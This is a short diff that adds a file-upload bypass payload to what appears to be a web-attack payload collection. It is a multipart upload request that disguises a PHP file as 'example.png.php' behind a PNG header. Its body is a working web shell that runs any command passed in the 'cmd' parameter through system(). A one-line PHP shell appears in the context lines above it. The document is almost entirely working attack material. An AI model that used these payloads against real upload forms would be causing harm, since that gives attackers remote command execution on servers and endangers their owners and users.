@@ -37,3 +37,28 @@ Content-Type: image/jpeg
 
 <?php system($_GET['cmd'])?>
 ```
+
+```yml
+------WebKitFormBoundaryhafeADAv1F9R0Cba
+Content-Disposition: form-data; name="file"; filename="example.png.php"
+Content-Type: application/octet-stream
+
+PNG 
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd'] . ' 2>&1');
+    }
+?>
+</pre>
+</body>
+</html>
+------WebKitFormBoundaryhafeADAv1F9R0Cba--
+```
